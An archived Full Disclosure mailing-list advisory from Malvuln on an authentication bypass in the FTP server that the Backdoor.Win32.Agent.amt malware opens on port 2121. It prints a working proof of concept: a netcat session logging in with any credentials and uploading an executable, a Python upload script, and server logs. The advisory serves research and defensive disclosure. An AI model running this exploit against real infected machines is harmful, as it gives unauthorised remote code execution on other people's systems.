---
title: BACKDOOR.WIN32.AGENT.AMT / Authentication Bypass
url: https://seclists.org/fulldisclosure/2024/Mar/6
source: Full Disclosure
date: 2024-03-04
fetch_date: 2025-10-04T12:11:40.294802
---

# BACKDOOR.WIN32.AGENT.AMT / Authentication Bypass

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# BACKDOOR.WIN32.AGENT.AMT / Authentication Bypass

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Wed, 28 Feb 2024 22:19:08 -0500

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/2a442d3da88f721a786ff33179c664b7.txt
Contact: malvuln13 () gmail com
Media: twitter.com/malvuln

Threat: Backdoor.Win32.Agent.amt
Vulnerability: Authentication Bypass
Description: The malware can run an FTP server which listens on TCP port
2121. Third-party attackers who can reach infected systems can logon using
any username/password combination. Intruders can then upload executables
using ftp PASV, STOR commands, this can result in remote code execution.
Family: Agent
Type: PE32
MD5: 2a442d3da88f721a786ff33179c664b7
Vuln ID: MVID-2024-0673
Disclosure: 02/28/2024

Exploit/PoC:
C:\sec>nc64.exe 192.168.18.125 2121
220 Welcome To mybr Ftp!
USER gg
331 Password required for gg.
PASS gg
230 User gg logged in.
SYST
215 UNIX Type: L8 Internet Component Suite
CDUP
250 CWD command successful. "C:/" is current directory.
PASV
227 Entering Passive Mode (192,168,18,125,211,164).
STOR DOOM_SM.exe
150 Opening data connection for DOOM_SM.exe.
226 File received ok

from socket import *
import time

HOST = "192.168.18.125"
PORT = 54180
BUF_SIZE = 32
s=socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

with open("DOOM_SM.exe", "rb") as f:
    while True:
        bytez = f.read(BUF_SIZE)
        if not bytez:
            break
        s.send(bytez)
        time.sleep(0.5)

print("By malvuln")
s.close()

1/23/2024 9:13:03 PM - gg - 0.0.0.0 Disconnected
1/23/2024 9:10:36 PM - gg - 0.0.0.0 STOR C:\DOOM_SM.exe
1/23/2024 9:09:54 PM - gg -  PASV C:\
1/23/2024 9:09:44 PM - CD C:\
1/23/2024 9:09:44 PM - gg -  CDUP C:\
1/23/2024 9:09:18 PM - gg -  SYST C:\
1/23/2024 9:09:15 PM - gg
1/23/2024 9:09:15 PM - gg -  PASS C:\TEMP\hate
1/23/2024 9:09:12 PM -  -  USER C:\TEMP\gg
1/23/2024 9:09:06 PM -  -  Connected
1/23/2024 9:08:58 PM - FTP Started

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **BACKDOOR.WIN32.AGENT.AMT / Authentication Bypass** *malvuln (Mar 02)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")